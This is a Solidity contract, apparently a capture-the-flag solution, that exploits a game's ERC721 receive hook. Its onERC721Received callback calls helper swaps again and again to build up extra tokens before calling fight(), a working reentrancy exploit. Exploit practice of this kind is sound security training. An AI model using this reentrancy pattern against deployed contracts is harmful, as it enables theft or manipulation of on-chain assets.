// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.12;

import "./Helper.sol";
import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";

contract CTF is IERC721Receiver, Test {
    Game game;
    Helper h1;
    Helper h2;
    uint8 receivedMons;

    constructor(
        address _game,
        address _helper1,
        address _helper2
    ) {
        game = Game(_game);
        game.join();
        h1 = Helper(_helper1);
        h2 = Helper(_helper2);
    }

    function attack() external {
        h1.swap(0);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public override returns (bytes4) {
        // First time a Mon is received we have 3 + 1 = 4
        receivedMons += 1;
        if (receivedMons < 4) {
            if (receivedMons == 1) {
                // that means we now have 4 + 1 = 5
                h1.swap(1);
            }
            if (receivedMons == 2) {
                // that means we now have 5 + 1 = 6
                h1.swap(2);
            }
            if (receivedMons == 3) {
                // that means we now have 6 + 1 = 7
                h2.swap(0);
            }
        } else {
            game.fight();
        }
        return this.onERC721Received.selector;
    }
}
